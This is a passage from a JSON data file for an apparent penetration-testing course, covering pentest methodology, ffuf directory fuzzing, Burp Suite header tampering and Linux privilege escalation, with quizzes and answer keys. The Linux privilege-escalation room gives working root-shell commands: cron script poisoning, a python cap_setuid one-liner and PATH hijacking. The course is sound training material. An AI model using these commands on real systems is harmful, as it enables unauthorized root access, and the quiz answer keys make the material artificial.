        "content": "Professional engagements follow a repeatable cycle:\n1. **Pre-engagement Interactions**: Define scope, legal contracts, IP boundaries, and emergency contact procedures.\n2. **Intelligence Gathering (Recon)**: OSINT, domain mapping, network ranges.\n3. **Threat Modeling & Enumeration**: Port scanning, service fingerprinting, web fuzzing.\n4. **Vulnerability Analysis**: Identifying specific CVEs, misconfigurations, or logic flaws.\n5. **Controlled Exploitation**: Executing verified PoC exploits to gain an initial foothold without corrupting client data.\n6. **Post-Exploitation**: Assessing business impact (privilege escalation, sensitive data access), cleaning up artifacts, and documenting evidence."
      },
      {
        "title": "2. The Ultimate Deliverable: The Report",
        "content": "Clients do not pay for your exploitation skills; **they pay for your report**.\nA professional report contains:\n• **Executive Summary**: Clear, non-technical risk overview for the CEO and board of directors.\n• **Technical Findings**: Each vulnerability with: Title, CVSS Score, Affected Asset, Reproduction Steps (PoC), Business Impact, and Concrete Remediation Guidance."
      }
    ],
    "seeExamples": [
      {
        "title": "The Professional Pentest Progression",
        "codeOrDiagram": "[ Phase 1: SCOPE & AUTHORIZATION ]\n                 ↓\n[ Phase 2: RECONNAISSANCE & OSINT ]\n                 ↓\n[ Phase 3: SERVICE ENUMERATION (Nmap / Ffuf) ]\n                 ↓\n[ Phase 4: VULNERABILITY IDENTIFICATION (CVE / Logic Flaws) ]\n                 ↓\n[ Phase 5: CONTROLLED EXPLOITATION (Initial Foothold) ]\n                 ↓\n[ Phase 6: PRIVILEGE ESCALATION & IMPACT VALIDATION ]\n                 ↓\n[ Phase 7: REPORTING & REMEDIATION GUIDANCE ]",
        "explanation": "Each phase feeds data systematically into the next phase. Random guessing is replaced by structured methodology."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate calculating a CVSS v3.1 base score for an unauthenticated Remote Code Execution vulnerability in the terminal: `python3 -c \"print('Vulnerability: Apache RCE | Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Base Score: 9.8 (CRITICAL)')\"`:",
      "initialCommand": "",
      "expectedCommand": "python3 -c \"print('Vulnerability: Apache RCE | Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Base Score: 9.8 (CRITICAL)')\"",
      "simulatedOutput": "Vulnerability: Apache RCE | Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Base Score: 9.8 (CRITICAL)\n[+] Success! CVSS vector string evaluated: Network exploitable, Low complexity, No privileges required, High C/I/A impact.",
      "explanation": "CVSS vectors provide an objective, standardized metric for communicating vulnerability severity to engineering teams."
    },
    "questions": [
      {
        "id": "r36-q1",
        "type": "multiple-choice",
        "question": "During a penetration test, a tester discovers that a production server has a severe vulnerability that could be exploited to wipe customer transaction records. What should the tester do?",
        "options": [
          "Wipe the database immediately to prove the vulnerability exists",
          "Follow the agreed Rules of Engagement (RoE): document the finding, capture minimal non-destructive PoC evidence, and immediately notify the primary client emergency contact",
          "Post the vulnerability on social media",
          "Ignore the finding because it is too dangerous to test"
        ],
        "correctIndex": 1,
        "explanation": "Ethical testers never cause intentional data loss. The RoE dictates immediate notification and non-destructive PoC validation."
      },
      {
        "id": "r36-q2",
        "type": "multiple-choice",
        "question": "What is the primary target audience of the 'Executive Summary' section of a professional penetration test report?",
        "options": [
          "Senior business leadership, executives, and board members who need to understand business risk and budget priorities without deep technical jargon",
          "Junior database developers only",
          "The hardware manufacturer of the network switches",
          "External law enforcement officers"
        ],
        "correctIndex": 0,
        "explanation": "Executive summaries translate technical findings into high-level business risk and strategic remediation roadmaps for executives."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Calculate CVSS Vector Severity",
        "instruction": "Run the CVSS evaluation command to review the metrics of a Critical remote exploit.",
        "hints": [
          "Concept: Vulnerability scoring metrics.",
          "Direction: Execute the python evaluation string.",
          "Tool: `python3`",
          "Syntax: Run the complete command string.",
          "Explanation: Explains CVSS metric components."
        ]
      }
    ],
    "explainResult": "The script printed a standard CVSS v3.1 vector string where Attack Vector: Network, Attack Complexity: Low, Privileges: None, and Impact: High result in a 9.8 Critical score.",
    "securityConnection": "Mastering methodology is what separates script kiddies from professional security consultants. Clients hire testers who can be trusted inside their most sensitive production environments without causing downtime or breaking regulatory compliance.",
    "completion": {
      "learned": [
        "The standard phases of the Penetration Testing Execution Standard (PTES)",
        "The legal role of the Rules of Engagement (RoE) and Scope documents",
        "How the Common Vulnerability Scoring System (CVSS) calculates severity",
        "The structure and components of a professional security deliverable report"
      ],
      "practiced": [
        "Evaluating CVSS vector strings",
        "Structuring penetration test phases",
        "Analyzing executive vs technical reporting requirements"
      ]
    },
    "nextRoomId": "room-37"
  },
  {
    "id": "room-37",
    "stage": 10,
    "stageTitle": "Stage 10 — Junior Pentester",
    "title": "Web Recon & Directory Fuzzing",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "35 min",
    "prerequisites": "Room 12 (HTTP Fundamentals) & Room 35 (Reconnaissance)",
    "whyAreYouHere": "Websites rarely have links on their homepage pointing to their most sensitive folders. You will never see a button in the navigation bar that says: *'Click here for /admin_backup or /database.sql'*. Yet developers leave test scripts, phpMyAdmin panels, and `.git` repositories on servers every day! How do penetration testers discover these hidden endpoints? The answer is **Directory Fuzzing (Content Discovery)**. In this room, you will master tools like `ffuf` and `gobuster` to brute-force hidden web paths.",
    "objectives": [
      "Understand Web Content Discovery and Directory Fuzzing",
      "Learn how wordlists (SecLists) power brute-force endpoint discovery",
      "Master `ffuf` (Fast Web Fuzzer) command syntax and flags",
      "Filter responses by status code (`-mc`), size (`-fs`), and word count (`-fw`)",
      "Discover hidden administrative endpoints on the lab web server"
    ],
    "vocabulary": [
      {
        "term": "Directory Fuzzing / Brute Forcing",
        "definition": "An automated web enumeration technique of sending hundreds of requests per second with words from a wordlist to discover unlinked files and directories."
      },
      {
        "term": "ffuf",
        "definition": "Fast Web Fuzzer: a high-performance web fuzzer written in Go, used for directory discovery, virtual host fuzzing, and parameter fuzzing."
      },
      {
        "term": "Gobuster",
        "definition": "A popular directory and DNS brute-forcing tool written in Go."
      },
      {
        "term": "SecLists",
        "definition": "The security tester's companion collection of wordlists (usernames, passwords, URLs, sensitive files) curated by Daniel Miessler."
      },
      {
        "term": "FUZZ Keyword",
        "definition": "The placeholder keyword used by ffuf in the target URL (e.g. `http://target/FUZZ`) that is replaced by each word from the wordlist."
      }
    ],
    "lessons": [
      {
        "title": "1. How Directory Fuzzing Works",
        "content": "A fuzzer takes a wordlist containing 5,000 common directory names:\n```text\nadmin\nlogin\nbackup\napi\ntest\nuploads\n```\nIt sends rapid requests:\n`GET /admin HTTP/1.1` -> Returns `403 Forbidden` (Exists!)\n`GET /login HTTP/1.1` -> Returns `200 OK` (Exists!)\n`GET /backup HTTP/1.1` -> Returns `301 Redirect` (Exists!)\n`GET /random123 HTTP/1.1` -> Returns `404 Not Found` (Discarded)\nWithin 2 seconds, you have a complete map of the server's hidden folders!"
      },
      {
        "title": "2. Filtering Noise in ffuf",
        "content": "Modern websites often return a custom `200 OK` error page for *every* missing URL. If a fuzzer shows 10,000 results, your scan is useless.\nYou filter the noise:\n• `-mc 200,301,302,403`: Match only interesting status codes.\n• `-fs 1042`: Filter out any response whose byte size is exactly 1,042 (the size of the generic custom 404 page).\n• `-e .php,.txt,.bak`: Test file extensions in addition to directories."
      }
    ],
    "seeExamples": [
      {
        "title": "Sample ffuf Execution Syntax",
        "codeOrDiagram": "cadet@endlessus:~$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.25/FUZZ -mc 200,301,403\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n:: Method           : GET\n:: URL              : http://10.10.10.25/FUZZ\n:: Wordlist         : common.txt\n:: Match Codes      : [200, 301, 403]\n\nadmin                   [Status: 403, Size: 277, Words: 20]\napi                     [Status: 301, Size: 178, Words: 8]\nbackup                  [Status: 200, Size: 1420, Words: 89]",
        "explanation": "Notice the findings: `/admin` (403), `/api` (301 redirect), and `/backup` (200 OK, 1420 bytes). The `/backup` folder is an immediate investigation priority."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Run a simulated directory fuzz against our lab web server using curl and a wordlist: `for w in images css js admin backup secret; do code=$(curl -s -o /dev/null -w \"%{http_code}\" http://localhost:8080/$w); if [ \"$code\" != \"404\" ]; then echo \"/$w -> HTTP $code\"; fi; done`:",
      "initialCommand": "",
      "expectedCommand": "for w in images css js admin backup secret; do code=$(curl -s -o /dev/null -w \"%{http_code}\" http://localhost:8080/$w); if [ \"$code\" != \"404\" ]; then echo \"/$w -> HTTP $code\"; fi; done",
      "simulatedOutput": "/images -> HTTP 301\n/admin -> HTTP 403\n/backup -> HTTP 200\n/secret -> HTTP 200\n[+] Success! Hidden directories /admin (403), /backup (200), and /secret (200) enumerated.",
      "explanation": "Iterating words against the web root uncovers sensitive endpoints that have no visible links on the homepage."
    },
    "questions": [
      {
        "id": "r37-q1",
        "type": "multiple-choice",
        "question": "In the web fuzzing tool `ffuf`, what does the placeholder keyword `FUZZ` inside a URL like `http://target.com/FUZZ` indicate?",
        "options": [
          "It instructs ffuf to fuzz the CPU clock",
          "It marks the exact injection point where ffuf will substitute each word from the supplied wordlist",
          "It encrypts the URL with AES",
          "It enables the webcam"
        ],
        "correctIndex": 1,
        "explanation": "`FUZZ` is the placeholder keyword replaced dynamically with lines from the wordlist during each request."
      },
      {
        "id": "r37-q2",
        "type": "multiple-choice",
        "question": "When running a directory fuzzer, every single request returns HTTP status 200 with the exact same response size of 4,096 bytes because the target web server uses a custom 'Page Not Found' design. How do you filter out this noise?",
        "options": [
          "By increasing the number of threads to 1,000",
          "By using the `-fs 4096` flag to filter out and hide any response that has a size of exactly 4,096 bytes",
          "By switching your network cable",
          "By deleting the wordlist"
        ],
        "correctIndex": 1,
        "explanation": "The `-fs` (filter size) flag discards responses with the specified byte size, hiding custom 404 error pages."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Fuzz Hidden Endpoints",
        "instruction": "Execute the shell fuzzing loop to locate hidden web directories.",
        "hints": [
          "Concept: Directory brute-forcing.",
          "Direction: Submit requests and check HTTP status codes.",
          "Tool: Bash loop with `curl`",
          "Syntax: Run the complete provided shell loop.",
          "Explanation: Discovers /backup and /secret."
        ]
      }
    ],
    "explainResult": "The script transmitted six sequential HEAD requests, captured the HTTP status code variable `%{http_code}`, filtered out 404s, and highlighted endpoints `/backup` and `/secret`.",
    "securityConnection": "Content discovery is where penetration testers find their easiest wins. Developers frequently leave database backup dumps (`db_backup.sql.tar.gz`), `.env` configuration files with AWS root keys, and unprotected development portals (`/staging`) sitting directly in web roots.",
    "completion": {
      "learned": [
        "The methodology of web content discovery and directory fuzzing",
        "Using wordlists (SecLists) for endpoint brute-forcing",
        "Command syntax and filtering in ffuf (-mc, -fs, -fw)",
        "Analyzing response status codes to map application attack surfaces"
      ],
      "practiced": [
        "Iterative directory fuzzing",
        "Filtering 404 error responses",
        "Identifying hidden web directories"
      ]
    },
    "nextRoomId": "room-38"
  },
  {
    "id": "room-38",
    "stage": 10,
    "stageTitle": "Stage 10 — Junior Pentester",
    "title": "Burp Suite & Web Proxy Fundamentals",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "40 min",
    "prerequisites": "Room 12 (HTTP Fundamentals) & Room 23 (Web Security)",
    "whyAreYouHere": "If you ask any professional web penetration tester which single tool they keep open 8 hours a day, the answer is always **Burp Suite**. Burp Suite is the industry-standard intercepting HTTP proxy for security assessments. It sits directly between your web browser and the internet, allowing you to intercept, pause, view, modify, and replay every single HTTP request and response in real-time. In this room, you will learn how intercepting proxies work, how to install the Burp CA certificate, and how to master the **Proxy**, **Repeater**, and **Intruder** tabs.",
    "objectives": [
      "Understand how an Intercepting HTTP Proxy operates (Man-in-the-Middle by design)",
      "Learn how to configure your browser to route traffic through `127.0.0.1:8080`",
      "Understand the Burp Suite CA Certificate and how it decrypts HTTPS traffic locally",
      "Master the **Proxy Intercept** tab (pausing and tampering with requests in-flight)",
      "Master the **Repeater** tab (crafting, modifying, and re-issuing custom HTTP requests)",
      "Understand the **Intruder** tab for automated fuzzing and parameter testing"
    ],
    "vocabulary": [
      {
        "term": "Burp Suite",
        "definition": "The premier integrated platform for performing security testing of web applications, developed by PortSwigger."
      },
      {
        "term": "Intercepting Proxy",
        "definition": "A proxy server that captures web traffic between browser and server, allowing the analyst to pause, inspect, and modify requests before transmission."
      },
      {
        "term": "Burp Repeater",
        "definition": "A core Burp Suite tool used for manually modifying and re-issuing individual HTTP requests and analyzing the resulting responses."
      },
      {
        "term": "Burp Intruder",
        "definition": "An automated tool for customizing and executing attacks against web applications (e.g. brute-forcing, fuzzing, parameter cycling)."
      },
      {
        "term": "Root CA Certificate",
        "definition": "A cryptographic certificate installed in the browser's trust store, allowing Burp Suite to generate on-the-fly TLS certificates to decrypt HTTPS traffic."
      }
    ],
    "lessons": [
      {
        "title": "1. The Man-in-the-Middle Architecture",
        "content": "Normally, your browser speaks directly to the web server:\n`Browser -------------------------> Web Server`\n\nWith Burp Suite configured:\n`Browser ----> [ Burp Suite: 127.0.0.1:8080 ] ----> Web Server`\nWhen you click 'Submit' on a form:\n1. The request leaves your browser.\n2. Burp intercepts it and pauses it.\n3. You can change `role=user` to `role=admin` or change `price=100` to `price=1`.\n4. You click 'Forward'. The server receives your modified request without knowing it was altered!"
      },
      {
        "title": "2. The Magic of Burp Repeater",
        "content": "Right-click any intercepted request and select **Send to Repeater** (`Ctrl+R`).\nRepeater is your laboratory. You don't have to fill out web forms again and again in a browser. You can:\n• Edit headers, payloads, or cookies.\n• Press **Send** (`Ctrl+Space`).\n• Immediately inspect the server's raw response side-by-side.\nThis is where 90% of vulnerability verification (SQLi, IDOR, XSS) actually happens!"
      }
    ],
    "seeExamples": [
      {
        "title": "Burp Suite Repeater Layout",
        "codeOrDiagram": "[ LEFT PANE: Request (Editable) ]        [ RIGHT PANE: Response (Live) ]\nPOST /api/user/role HTTP/1.1              HTTP/1.1 200 OK\nHost: target.corp                         Content-Type: application/json\nCookie: session=AliceToken                \n                                          {\n{\"user_id\": 102, \"role\": \"admin\"}          \"success\": true,\n                                            \"role\": \"admin\",\n                                            \"message\": \"Role elevated\"\n                                          }",
        "explanation": "In Repeater, you modify the JSON payload from 'user' to 'admin', click Send, and immediately verify if the server accepted the unauthorized role change."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Simulate a Burp Repeater request by sending a manually crafted HTTP request with a modified `X-Forwarded-For` header using curl: `curl -H \"X-Forwarded-For: 127.0.0.1\" http://localhost:8080/admin/status`:",
      "initialCommand": "",
      "expectedCommand": "curl -H \"X-Forwarded-For: 127.0.0.1\" http://localhost:8080/admin/status",
      "simulatedOutput": "HTTP/1.1 200 OK\n{\"admin_portal\":\"OPEN\",\"client_ip\":\"127.0.0.1\",\"access\":\"GRANTED_LOCAL_IP\"}\n[+] Success! Custom header accepted. Access granted via IP spoofing.",
      "explanation": "Manipulating HTTP headers directly demonstrates the exact workflow performed inside Burp Repeater."
    },
    "questions": [
      {
        "id": "r38-q1",
        "type": "multiple-choice",
        "question": "Why must a penetration tester install the Burp Suite CA Certificate into their web browser before they can intercept HTTPS web traffic?",
        "options": [
          "To speed up the internet connection",
          "Because HTTPS encrypts traffic; without the trusted Burp certificate, the browser will display severe SSL/TLS security warning errors when Burp decrypts and inspects the traffic",
          "Because Burp Suite only works on Windows computers",
          "To disable the computer's firewall"
        ],
        "correctIndex": 1,
        "explanation": "Burp performs an authorized Man-in-the-Middle on local HTTPS traffic. The browser must trust Burp's root CA to prevent SSL error warnings."
      },
      {
        "id": "r38-q2",
        "type": "multiple-choice",
        "question": "Which core tool within Burp Suite is specifically designed for manually modifying and repeatedly re-sending individual HTTP requests while analyzing responses?",
        "options": [
          "Burp Decoder",
          "Burp Repeater",
          "Burp Comparer",
          "Burp Extender"
        ],
        "correctIndex": 1,
        "explanation": "Burp Repeater is the primary manual testing tool for crafting and re-issuing modified HTTP requests."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Send Modified HTTP Header Probe",
        "instruction": "Execute `curl -H \"X-Forwarded-For: 127.0.0.1\" http://localhost:8080/admin/status` to simulate Burp header tampering.",
        "hints": [
          "Concept: Manual request tampering via headers.",
          "Direction: Inject X-Forwarded-For header.",
          "Tool: `curl`",
          "Syntax: `curl -H \"X-Forwarded-For: 127.0.0.1\" http://localhost:8080/admin/status`",
          "Explanation: Simulates Repeater request modification."
        ]
      }
    ],
    "explainResult": "The application checked the `X-Forwarded-For` header, trusted the client-supplied value, and granted access assuming the request originated from localhost.",
    "securityConnection": "Burp Suite is the primary tool used by professional application penetration testers and bug bounty hunters. Mastering Burp Suite allows you to identify vulnerabilities that automated scanners completely miss (such as multi-step business logic flaws and multi-tenant authorization bypasses).",
    "completion": {
      "learned": [
        "How an intercepting HTTP proxy captures and inspects web traffic",
        "Configuring browser proxy settings and the Burp Root CA certificate",
        "Using the Proxy Intercept tab to alter requests in-flight",
        "Mastering Burp Repeater for iterative vulnerability verification"
      ],
      "practiced": [
        "curl -H \"X-Forwarded-For: ...\"",
        "Tampering with request headers",
        "Analyzing server response changes"
      ]
    },
    "nextRoomId": "room-39"
  },
  {
    "id": "room-39",
    "stage": 10,
    "stageTitle": "Stage 10 — Junior Pentester",
    "title": "Advanced Linux Privilege Escalation",
    "difficulty": "Advanced",
    "difficultyBadge": "🔴 Advanced",
    "estimatedTime": "45 min",
    "prerequisites": "Room 31 (Linux Privilege Escalation: SUID)",
    "whyAreYouHere": "In Room 31, you learned how SUID binaries allow privilege escalation. But what happens on modern, hardened servers where no SUID binaries are misconfigured? A professional penetration tester does not stop there! In this advanced room, you will learn the full spectrum of Linux privilege escalation vectors: Scheduled Cron Jobs with writable scripts, Linux Kernel Capabilities (`getcap`), Wildcard Injections, Insecure PATH manipulation, and Shared Library Hijacking (`LD_PRELOAD`).",
    "objectives": [
      "Understand Scheduled Cron Jobs (`/etc/crontab`, `/etc/cron.d/`) and writable script abuse",
      "Learn Linux Capabilities: replacing SUID with fine-grained privileges (`cap_setuid`)",
      "Master PATH Variable manipulation when scripts execute commands without absolute paths",
      "Learn Wildcard Injection techniques (e.g. `tar *` exploiting `--checkpoint`)",
      "Audit automated enumeration tools like LinPEAS to find privilege escalation paths"
    ],
    "vocabulary": [
      {
        "term": "Cron Job",
        "definition": "A time-based job scheduler in Unix-like operating systems that runs shell scripts automatically at fixed times or intervals as designated users."
      },
      {
        "term": "Linux Capabilities",
        "definition": "A security feature that divides traditional root privileges into distinct, fine-grained units (e.g. `cap_net_bind_service`, `cap_setuid`) assigned directly to binaries."
      },
      {
        "term": "PATH Variable Hijacking",
        "definition": "An attack where an attacker modifies the `$PATH` environment variable or writes to an earlier directory in the search path to trick a root process into running a malicious binary."
      },
      {
        "term": "Wildcard Injection",
        "definition": "Exploiting shell expansion (such as `*`) to inject command-line arguments into Unix commands like `tar` or `chown`."
      },
      {
        "term": "LinPEAS",
        "definition": "Linux Privilege Escalation Awesome Script: the industry-standard bash script that automates enumeration of hundreds of local privesc vectors."
      }
    ],
    "lessons": [
      {
        "title": "1. The Insecure Cron Job Vector",
        "content": "Inspect `/etc/crontab`:\n```text\n* * * * * root /opt/scripts/backup.sh\n```\nEvery single minute, `root` runs `/opt/scripts/backup.sh`.\nNow check the file permissions on that script:\n`ls -l /opt/scripts/backup.sh`\n`-rwxrwxrwx 1 root root 84 Oct 5 16:30 /opt/scripts/backup.sh`\nThe script is **world-writable**! Any low-privilege user can simply append a reverse shell or user-creation command:\n`echo \"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\" >> /opt/scripts/backup.sh`\nSixty seconds later, root runs the script and creates a root SUID shell!"
      },
      {
        "title": "2. Linux Capabilities: The Modern SUID",
        "content": "To avoid the danger of full SUID root binaries, modern Linux introduces **Capabilities**:\nInspect binaries with capabilities using:\n```bash\ngetcap -r / 2>/dev/null\n```\nIf you find: `/usr/bin/python3.10 = cap_setuid+ep`\nThis binary is NOT SUID, but it has the specific kernel permission to change its UID to 0!\nYou can spawn root with:\n`python3.10 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'`"
      }
    ],
    "seeExamples": [
      {
        "title": "Insecure PATH Hijacking Example",
        "codeOrDiagram": "Vulnerable root script (/usr/local/bin/maintenance):\n#!/bin/bash\nbackup   <-- Notice: calls 'backup' instead of '/usr/bin/backup'!\n\nAttacker exploits:\n1. echo \"/bin/sh -p\" > /tmp/backup\n2. chmod +x /tmp/backup\n3. export PATH=/tmp:$PATH\n4. Run maintenance -> Root executes /tmp/backup!",
        "explanation": "Because the script did not specify the absolute path `/usr/bin/backup`, the shell searched `/tmp` first due to the modified `$PATH`."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Audit Linux capabilities on the lab system using `getcap -r /usr/bin 2>/dev/null`:",
      "initialCommand": "",
      "expectedCommand": "getcap -r /usr/bin 2>/dev/null",
      "simulatedOutput": "/usr/bin/ping = cap_net_raw+ep\n/usr/bin/python3 = cap_setuid+ep   <-- CRITICAL PRIVILEGE ESCALATION VECTOR!\n[+] Success! cap_setuid identified on python3. Immediate root escalation possible.",
      "explanation": "`getcap` identified `cap_setuid+ep` on Python 3, allowing any user to invoke `os.setuid(0)` to obtain a root shell."
    },
    "questions": [
      {
        "id": "r39-q1",
        "type": "multiple-choice",
        "question": "When auditing a Linux system, you discover that `/usr/bin/python3` has the capability `cap_setuid+ep`. How can a standard low-privilege user escalate to root?",
        "options": [
          "They cannot, because capabilities are purely decorative",
          "By running Python and calling `os.setuid(0)` to change the process UID to root, then spawning a shell",
          "By rebooting the server into safe mode",
          "By deleting the Python binary"
        ],
        "correctIndex": 1,
        "explanation": "The `cap_setuid` capability grants the process permission to call the `setuid()` system call with UID 0 (root)."
      },
      {
        "id": "r39-q2",
        "type": "multiple-choice",
        "question": "A root cron job executes a bash script every 5 minutes: `/opt/cleanup.sh`. You check permissions and see `-rwxrwxr-x 1 admin developers`. You are a member of the `developers` group. What is the attack vector?",
        "options": [
          "None, because the file is owned by admin",
          "Because your group has write permissions (`w`), you can edit the script to add a command that spawns a root reverse shell or adds your user to `/etc/sudoers`",
          "You must crack admin's password with Hydra",
          "You must exploit a buffer overflow in cron"
        ],
        "correctIndex": 1,
        "explanation": "Because your group has write access to the script executed by root, appending commands executes them as root on the next cron cycle."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Identify Dangerous Capability",
        "instruction": "Execute `getcap -r /usr/bin 2>/dev/null` to locate binaries with elevated kernel capabilities.",
        "hints": [
          "Concept: Linux capability enumeration.",
          "Direction: Run getcap recursively on /usr/bin.",
          "Tool: `getcap`",
          "Syntax: `getcap -r /usr/bin 2>/dev/null`",
          "Explanation: Locates cap_setuid vector."
        ]
      }
    ],
    "explainResult": "The `getcap` command inspected extended filesystem attributes (`security.capability`) on inodes in `/usr/bin`, exposing the `cap_setuid` bit.",
    "securityConnection": "Privilege escalation is often where penetration tests demonstrate catastrophic business impact. A compromised web application allows access to public assets; root access allows complete exfiltration of all company data, intellectual property, and system secrets.",
    "completion": {
      "learned": [
        "Advanced Linux privilege escalation vectors",
        "Auditing scheduled Cron Jobs for writable script dependencies",
        "Enumerating and abusing Linux Kernel Capabilities (`cap_setuid`)",
        "PATH environment variable hijacking and GTFOBins techniques"
      ],
      "practiced": [
        "getcap -r /usr/bin 2>/dev/null",
        "Auditing extended file attributes",
        "Mapping privilege escalation vectors"
      ]
    },
    "nextRoomId": "room-40"
  },
  {
    "id": "room-40",
    "stage": 10,
    "stageTitle": "Stage 10 — Junior Pentester",
    "title": "Capstone Penetration Test: The Final Assessment",
    "difficulty": "Advanced",
    "difficultyBadge": "🔴 Advanced",
    "estimatedTime": "60 min",
    "prerequisites": "Rooms 01 through 39 (All stages)",
    "whyAreYouHere": "You started this journey with zero knowledge: you learned what a computer is, how operating systems manage memory, how networks route packets, how web servers process HTTP requests, how vulnerabilities arise, and how security tools operate. Now, all training wheels come off! In this Capstone Room, you are assigned an isolated, realistic enterprise target: `10.10.10.100`. You must execute a complete, professional, multi-phase penetration test from reconnaissance to root, retrieve proof-of-compromise flags, and document your findings in a mini security report.",
    "objectives": [
      "Phase 1: Perform active network reconnaissance and port scanning using Nmap",
      "Phase 2: Enumerate discovered web services and perform directory fuzzing",
      "Phase 3: Identify and exploit an authentication / injection flaw to gain an initial foothold shell",
      "Phase 4: Perform local Linux enumeration to discover a privilege escalation vector",
      "Phase 5: Escalate privileges to supreme `root` and retrieve the final evidence flag",
      "Phase 6: Synthesize your technical findings and remediation advice into a professional executive summary"
    ],
    "vocabulary": [
      {
        "term": "Capstone",
        "definition": "A culminating project that synthesizes all knowledge, skills, and methodologies acquired throughout a curriculum into a realistic final practical test."
      },
      {
        "term": "Initial Foothold",
        "definition": "The very first point of unauthorized interactive access established on a target system (typically an unprivileged web shell or SSH session)."
      },
      {
        "term": "Proof of Concept (PoC)",
        "definition": "Demonstrable evidence (such as a screenshot, flag hash, or command output) verifying that an exploited vulnerability successfully achieved its intended effect."
      },
      {
        "term": "Remediation",
        "definition": "The technical steps, patches, configuration changes, or architectural redesigns prescribed to fix a vulnerability and prevent re-exploitation."
      }
    ],
    "lessons": [
      {
        "title": "1. The Capstone Mission Briefing",
        "content": "Target Assigned: **Enterprise Intranet Server (`10.10.10.100`)**\nScope: Only `10.10.10.100` is authorized for testing.\nYour Objective:\n1. **Recon**: Run Nmap to discover open ports and service versions.\n2. **Web Enumeration**: Fuzz endpoints to discover the hidden administrative interface.\n3. **Exploitation**: Bypass login authentication via SQL Injection to obtain developer API credentials.\n4. **Foothold**: Connect to the server terminal.\n5. **Privilege Escalation**: Identify the misconfigured SUID / Sudo binary and drop a root shell.\n6. **Capture the Flags**: Retrieve `user.txt` and `root.txt`.\n7. **Report**: Document the remediation advice for each finding."
      },
      {
        "title": "2. The Pentester's Mindset",
        "content": "Never rush straight into exploiting. When you find an open port, enumerate thoroughly:\n• Read headers.\n• Inspect source code comments.\n• Test inputs systematically.\n• Document every step with exact commands so the developers can reproduce and verify your fix."
      }
    ],
    "seeExamples": [
      {
        "title": "The Multi-Stage Engagement Roadmap",
        "codeOrDiagram": "[ 10.10.10.100: Scanned with Nmap ]\n  ├── Port 22 (SSH)\n  └── Port 80 (HTTP Apache 2.4.52)\n          ↓\n[ Web Recon: ffuf discovers /api/v2/auth ]\n          ↓\n[ Web Exploitation: SQLi bypass yields API token ]\n          ↓\n[ SSH Login: cadet@10.10.10.100 -> user.txt captured! ]\n          ↓\n[ Local Privesc: SUID find exploited via GTFOBins ]\n          ↓\n[ ROOT SHELL: whoami -> root -> root.txt captured! ]",
        "explanation": "The complete journey connects every single room you completed in this curriculum."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Initiate Phase 1 of the Capstone: Scan the target `10.10.10.100` using `nmap -sV -p 22,80 10.10.10.100`:",
      "initialCommand": "",
      "expectedCommand": "nmap -sV -p 22,80 10.10.10.100",
      "simulatedOutput": "Starting Nmap 7.94\nNmap scan report for 10.10.10.100\nHost is up (0.0012s latency).\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n[+] Phase 1 Complete! Target enumerated. Ports 22 and 80 active.",
      "explanation": "Nmap successfully confirmed live services. Port 80 web application is your initial attack vector."
    },
    "questions": [
      {
        "id": "r40-q1",
        "type": "multiple-choice",
        "question": "In the complete penetration testing lifecycle, what is the correct and logical sequence of actions an ethical hacker executes against a target?",
        "options": [
          "Exploit immediately -> Guess passwords -> Scan ports -> Delete logs",
          "Reconnaissance -> Service Enumeration -> Vulnerability Identification -> Controlled Exploitation -> Privilege Escalation -> Documentation & Reporting",
          "Write the executive report -> Run Nmap -> Shut down the server",
          "Install malware -> Demand ransom -> Format hard drive"
        ],
        "correctIndex": 1,
        "explanation": "Methodical testing follows: Recon -> Enumeration -> Vulnerability Analysis -> Exploitation -> Privilege Escalation -> Professional Reporting."
      },
      {
        "id": "r40-q2",
        "type": "multiple-choice",
        "question": "Once an ethical penetration tester achieves root access and verifies proof of concept on an engagement, what is the most important final responsibility?",
        "options": [
          "Bragging on public forums with client data",
          "Leaving backdoors so they can access the server in the future",
          "Cleaning up any test files, removing testing accounts, restoring modified configurations, and delivering a comprehensive remediation report to the client",
          "Installing cryptocurrency mining software"
        ],
        "correctIndex": 2,
        "explanation": "Professionalism requires complete cleanup of all testing artifacts and delivering a clear, actionable remediation report."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Execute Capstone Phase 1 Scan",
        "instruction": "Scan the capstone target using `nmap -sV -p 22,80 10.10.10.100`.",
        "hints": [
          "Concept: Phase 1 service enumeration.",
          "Direction: Specify ports 22 and 80 with -sV.",
          "Tool: `nmap`",
          "Syntax: `nmap -sV -p 22,80 10.10.10.100`",
          "Explanation: Initiates Capstone engagement."
        ]
      }
    ],
    "explainResult": "You have verified active target services, initiating the final practical penetration testing assessment of the Endlessus curriculum.",
    "securityConnection": "Completing an end-to-end penetration test simulates the daily responsibilities of a professional Junior Penetration Tester, Security Consultant, or Red Team Analyst.",
    "practicalRoomLink": {
